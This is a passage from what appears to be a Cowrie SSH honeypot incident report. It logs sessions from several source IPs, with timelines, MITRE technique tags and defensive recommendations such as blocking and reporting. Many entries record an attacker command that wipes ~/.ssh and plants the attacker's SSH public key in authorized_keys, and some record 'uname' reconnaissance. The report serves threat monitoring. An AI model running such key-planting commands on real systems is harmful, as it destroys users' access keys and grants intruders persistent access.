| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 03:57:25` | `cowrie.session.connect` |
| `2026-04-17 03:57:25` | `cowrie.client.version` |
| `2026-04-17 03:57:25` | `cowrie.client.kex` |
| `2026-04-17 03:57:25` | `cowrie.login.success` |
| `2026-04-17 03:57:25` | `cowrie.session.params` |
| `2026-04-17 03:57:25` | `cowrie.command.input` |
| `2026-04-17 03:57:25` | `cowrie.command.failed` |
| `2026-04-17 03:57:25` | `cowrie.log.closed` |
| `2026-04-17 03:57:26` | `cowrie.session.params` |
| `2026-04-17 03:57:26` | `cowrie.command.input` |
| `2026-04-17 03:57:26` | `cowrie.session.file_download` |
| `2026-04-17 03:57:26` | `cowrie.log.closed` |
| `2026-04-17 03:57:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.64.74[.]51` to AbuseIPDB if not already reported
- [ ] Block `45.64.74[.]51` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3fa2ab33526b

| Field | Detail |
|---|---|
| **Source IP** | `45.64.74[.]51` |
| **First Seen** | 2026-04-17 03:57 |
| **Last Seen** | 2026-04-17 03:57 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 03:57:27` | `cowrie.session.connect` |
| `2026-04-17 03:57:27` | `cowrie.client.version` |
| `2026-04-17 03:57:28` | `cowrie.client.kex` |
| `2026-04-17 03:57:28` | `cowrie.login.success` |
| `2026-04-17 03:57:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.64.74[.]51` to AbuseIPDB if not already reported
- [ ] Block `45.64.74[.]51` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-004bb89adb2d

| Field | Detail |
|---|---|
| **Source IP** | `45.64.74[.]51` |
| **First Seen** | 2026-04-17 04:00 |
| **Last Seen** | 2026-04-17 04:00 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 04:00:38` | `cowrie.session.connect` |
| `2026-04-17 04:00:38` | `cowrie.client.version` |
| `2026-04-17 04:00:38` | `cowrie.client.kex` |
| `2026-04-17 04:00:38` | `cowrie.login.success` |
| `2026-04-17 04:00:39` | `cowrie.session.params` |
| `2026-04-17 04:00:39` | `cowrie.command.input` |
| `2026-04-17 04:00:39` | `cowrie.command.failed` |
| `2026-04-17 04:00:39` | `cowrie.log.closed` |
| `2026-04-17 04:00:39` | `cowrie.session.params` |
| `2026-04-17 04:00:39` | `cowrie.command.input` |
| `2026-04-17 04:00:39` | `cowrie.session.file_download` |
| `2026-04-17 04:00:39` | `cowrie.log.closed` |
| `2026-04-17 04:00:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.64.74[.]51` to AbuseIPDB if not already reported
- [ ] Block `45.64.74[.]51` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1a0bc7162d35

| Field | Detail |
|---|---|
| **Source IP** | `45.64.74[.]51` |
| **First Seen** | 2026-04-17 04:00 |
| **Last Seen** | 2026-04-17 04:00 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 04:00:41` | `cowrie.session.connect` |
| `2026-04-17 04:00:41` | `cowrie.client.version` |
| `2026-04-17 04:00:41` | `cowrie.client.kex` |
| `2026-04-17 04:00:41` | `cowrie.login.success` |
| `2026-04-17 04:00:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.64.74[.]51` to AbuseIPDB if not already reported
- [ ] Block `45.64.74[.]51` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b91520d7d4ae

| Field | Detail |
|---|---|
| **Source IP** | `180.97.199[.]20` |
| **First Seen** | 2026-04-17 04:32 |
| **Last Seen** | 2026-04-17 04:33 |
| **Session Duration** | 42s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 04:32:50` | `cowrie.session.connect` |
| `2026-04-17 04:32:50` | `cowrie.client.version` |
| `2026-04-17 04:32:52` | `cowrie.client.kex` |
| `2026-04-17 04:33:32` | `cowrie.login.success` |
| `2026-04-17 04:33:32` | `cowrie.session.params` |
| `2026-04-17 04:33:32` | `cowrie.command.input` |
| `2026-04-17 04:33:33` | `cowrie.log.closed` |
| `2026-04-17 04:33:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.97.199[.]20` to AbuseIPDB if not already reported
- [ ] Block `180.97.199[.]20` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-26e2d709d7b1

| Field | Detail |
|---|---|
| **Source IP** | `120.48.112[.]221` |
| **First Seen** | 2026-04-17 04:42 |
| **Last Seen** | 2026-04-17 04:42 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 04:42:38` | `cowrie.session.connect` |
| `2026-04-17 04:42:38` | `cowrie.client.version` |
| `2026-04-17 04:42:41` | `cowrie.client.kex` |
| `2026-04-17 04:42:45` | `cowrie.login.success` |
| `2026-04-17 04:42:46` | `cowrie.session.params` |
| `2026-04-17 04:42:46` | `cowrie.command.input` |
| `2026-04-17 04:42:47` | `cowrie.log.closed` |
| `2026-04-17 04:42:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.112[.]221` to AbuseIPDB if not already reported
- [ ] Block `120.48.112[.]221` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8f0648bf4f6b

| Field | Detail |
|---|---|
| **Source IP** | `101.47.159[.]50` |
| **First Seen** | 2026-04-17 04:51 |
| **Last Seen** | 2026-04-17 04:51 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 04:51:08` | `cowrie.session.connect` |
| `2026-04-17 04:51:08` | `cowrie.client.version` |
| `2026-04-17 04:51:08` | `cowrie.client.kex` |
| `2026-04-17 04:51:09` | `cowrie.login.success` |
| `2026-04-17 04:51:09` | `cowrie.session.params` |
| `2026-04-17 04:51:09` | `cowrie.command.input` |
| `2026-04-17 04:51:09` | `cowrie.command.failed` |
| `2026-04-17 04:51:09` | `cowrie.log.closed` |
| `2026-04-17 04:51:10` | `cowrie.session.params` |
| `2026-04-17 04:51:10` | `cowrie.command.input` |
| `2026-04-17 04:51:10` | `cowrie.session.file_download` |
| `2026-04-17 04:51:10` | `cowrie.log.closed` |
| `2026-04-17 04:51:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.47.159[.]50` to AbuseIPDB if not already reported
- [ ] Block `101.47.159[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8ee51e6ebbd2

| Field | Detail |
|---|---|
| **Source IP** | `101.47.159[.]50` |
| **First Seen** | 2026-04-17 04:51 |
| **Last Seen** | 2026-04-17 04:51 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 04:51:12` | `cowrie.session.connect` |
| `2026-04-17 04:51:12` | `cowrie.client.version` |
| `2026-04-17 04:51:12` | `cowrie.client.kex` |
| `2026-04-17 04:51:13` | `cowrie.login.success` |
| `2026-04-17 04:51:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.47.159[.]50` to AbuseIPDB if not already reported
- [ ] Block `101.47.159[.]50` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e8164994a2dc

| Field | Detail |
|---|---|
| **Source IP** | `179.57.170[.]71` |
| **First Seen** | 2026-04-17 04:55 |
| **Last Seen** | 2026-04-17 04:55 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 04:55:26` | `cowrie.session.connect` |
| `2026-04-17 04:55:26` | `cowrie.client.version` |
| `2026-04-17 04:55:26` | `cowrie.client.kex` |
| `2026-04-17 04:55:28` | `cowrie.login.success` |
| `2026-04-17 04:55:29` | `cowrie.session.params` |
| `2026-04-17 04:55:29` | `cowrie.command.input` |
| `2026-04-17 04:55:29` | `cowrie.command.failed` |
| `2026-04-17 04:55:29` | `cowrie.log.closed` |
| `2026-04-17 04:55:30` | `cowrie.session.params` |
| `2026-04-17 04:55:30` | `cowrie.command.input` |
| `2026-04-17 04:55:30` | `cowrie.session.file_download` |
| `2026-04-17 04:55:30` | `cowrie.log.closed` |
| `2026-04-17 04:55:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.57.170[.]71` to AbuseIPDB if not already reported
- [ ] Block `179.57.170[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ff8cb6657743

| Field | Detail |
|---|---|
| **Source IP** | `179.57.170[.]71` |
| **First Seen** | 2026-04-17 04:55 |
| **Last Seen** | 2026-04-17 04:55 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 04:55:34` | `cowrie.session.connect` |
| `2026-04-17 04:55:34` | `cowrie.client.version` |
| `2026-04-17 04:55:34` | `cowrie.client.kex` |
| `2026-04-17 04:55:36` | `cowrie.login.success` |
| `2026-04-17 04:55:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.57.170[.]71` to AbuseIPDB if not already reported
- [ ] Block `179.57.170[.]71` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f6cfa3cef270

| Field | Detail |
|---|---|
| **Source IP** | `27.128.240[.]75` |
| **First Seen** | 2026-04-17 05:01 |
| **Last Seen** | 2026-04-17 05:01 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 05:01:17` | `cowrie.session.connect` |
| `2026-04-17 05:01:17` | `cowrie.client.version` |
| `2026-04-17 05:01:17` | `cowrie.client.kex` |
| `2026-04-17 05:01:18` | `cowrie.login.success` |
| `2026-04-17 05:01:18` | `cowrie.session.params` |
| `2026-04-17 05:01:18` | `cowrie.command.input` |
| `2026-04-17 05:01:18` | `cowrie.command.failed` |
| `2026-04-17 05:01:18` | `cowrie.log.closed` |
| `2026-04-17 05:01:18` | `cowrie.session.params` |
| `2026-04-17 05:01:18` | `cowrie.command.input` |
| `2026-04-17 05:01:19` | `cowrie.session.file_download` |
| `2026-04-17 05:01:19` | `cowrie.log.closed` |
| `2026-04-17 05:01:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.128.240[.]75` to AbuseIPDB if not already reported
- [ ] Block `27.128.240[.]75` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-108d3770aaf0

| Field | Detail |
|---|---|
| **Source IP** | `27.128.240[.]75` |
| **First Seen** | 2026-04-17 05:01 |
| **Last Seen** | 2026-04-17 05:01 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 05:01:21` | `cowrie.session.connect` |
| `2026-04-17 05:01:21` | `cowrie.client.version` |
| `2026-04-17 05:01:21` | `cowrie.client.kex` |
| `2026-04-17 05:01:22` | `cowrie.login.success` |
| `2026-04-17 05:01:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.128.240[.]75` to AbuseIPDB if not already reported
- [ ] Block `27.128.240[.]75` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-64f239400af6

| Field | Detail |
|---|---|
| **Source IP** | `179.57.170[.]71` |
| **First Seen** | 2026-04-17 05:03 |
| **Last Seen** | 2026-04-17 05:03 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 05:03:12` | `cowrie.session.connect` |
| `2026-04-17 05:03:12` | `cowrie.client.version` |
| `2026-04-17 05:03:12` | `cowrie.client.kex` |
| `2026-04-17 05:03:14` | `cowrie.login.success` |
| `2026-04-17 05:03:15` | `cowrie.session.params` |
| `2026-04-17 05:03:15` | `cowrie.command.input` |
| `2026-04-17 05:03:15` | `cowrie.command.failed` |
| `2026-04-17 05:03:15` | `cowrie.log.closed` |
| `2026-04-17 05:03:16` | `cowrie.session.params` |
| `2026-04-17 05:03:16` | `cowrie.command.input` |
| `2026-04-17 05:03:16` | `cowrie.session.file_download` |
| `2026-04-17 05:03:16` | `cowrie.log.closed` |
| `2026-04-17 05:03:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.57.170[.]71` to AbuseIPDB if not already reported
- [ ] Block `179.57.170[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f834492c102e

| Field | Detail |
|---|---|
| **Source IP** | `179.57.170[.]71` |
| **First Seen** | 2026-04-17 05:03 |
| **Last Seen** | 2026-04-17 05:03 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 05:03:20` | `cowrie.session.connect` |
| `2026-04-17 05:03:20` | `cowrie.client.version` |
| `2026-04-17 05:03:20` | `cowrie.client.kex` |
| `2026-04-17 05:03:22` | `cowrie.login.success` |
| `2026-04-17 05:03:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.57.170[.]71` to AbuseIPDB if not already reported
- [ ] Block `179.57.170[.]71` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b9a98cd56524

| Field | Detail |
|---|---|
| **Source IP** | `179.57.170[.]71` |
| **First Seen** | 2026-04-17 05:12 |
| **Last Seen** | 2026-04-17 05:12 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 05:12:43` | `cowrie.session.connect` |
| `2026-04-17 05:12:43` | `cowrie.client.version` |
| `2026-04-17 05:12:43` | `cowrie.client.kex` |
| `2026-04-17 05:12:45` | `cowrie.login.success` |
| `2026-04-17 05:12:45` | `cowrie.session.params` |
| `2026-04-17 05:12:45` | `cowrie.command.input` |
| `2026-04-17 05:12:45` | `cowrie.command.failed` |
| `2026-04-17 05:12:46` | `cowrie.log.closed` |
| `2026-04-17 05:12:47` | `cowrie.session.params` |
| `2026-04-17 05:12:47` | `cowrie.command.input` |
| `2026-04-17 05:12:47` | `cowrie.session.file_download` |
| `2026-04-17 05:12:47` | `cowrie.log.closed` |
| `2026-04-17 05:12:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.57.170[.]71` to AbuseIPDB if not already reported
- [ ] Block `179.57.170[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4e05e81cdedc

| Field | Detail |
|---|---|
| **Source IP** | `179.57.170[.]71` |
| **First Seen** | 2026-04-17 05:12 |
| **Last Seen** | 2026-04-17 05:12 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 05:12:51` | `cowrie.session.connect` |
| `2026-04-17 05:12:51` | `cowrie.client.version` |
| `2026-04-17 05:12:51` | `cowrie.client.kex` |
| `2026-04-17 05:12:53` | `cowrie.login.success` |
| `2026-04-17 05:12:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.57.170[.]71` to AbuseIPDB if not already reported
- [ ] Block `179.57.170[.]71` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b0eb847f2b05

| Field | Detail |
|---|---|
| **Source IP** | `179.57.170[.]71` |
| **First Seen** | 2026-04-17 05:14 |
| **Last Seen** | 2026-04-17 05:14 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 05:14:42` | `cowrie.session.connect` |
| `2026-04-17 05:14:42` | `cowrie.client.version` |
| `2026-04-17 05:14:42` | `cowrie.client.kex` |
| `2026-04-17 05:14:44` | `cowrie.login.success` |
| `2026-04-17 05:14:44` | `cowrie.session.params` |
| `2026-04-17 05:14:44` | `cowrie.command.input` |
| `2026-04-17 05:14:44` | `cowrie.command.failed` |
| `2026-04-17 05:14:45` | `cowrie.log.closed` |
| `2026-04-17 05:14:46` | `cowrie.session.params` |
| `2026-04-17 05:14:46` | `cowrie.command.input` |
| `2026-04-17 05:14:46` | `cowrie.session.file_download` |
| `2026-04-17 05:14:46` | `cowrie.log.closed` |
| `2026-04-17 05:14:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.57.170[.]71` to AbuseIPDB if not already reported
- [ ] Block `179.57.170[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-82c73da4491f

| Field | Detail |
|---|---|
| **Source IP** | `179.57.170[.]71` |
| **First Seen** | 2026-04-17 05:14 |
| **Last Seen** | 2026-04-17 05:14 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 05:14:50` | `cowrie.session.connect` |
| `2026-04-17 05:14:50` | `cowrie.client.version` |
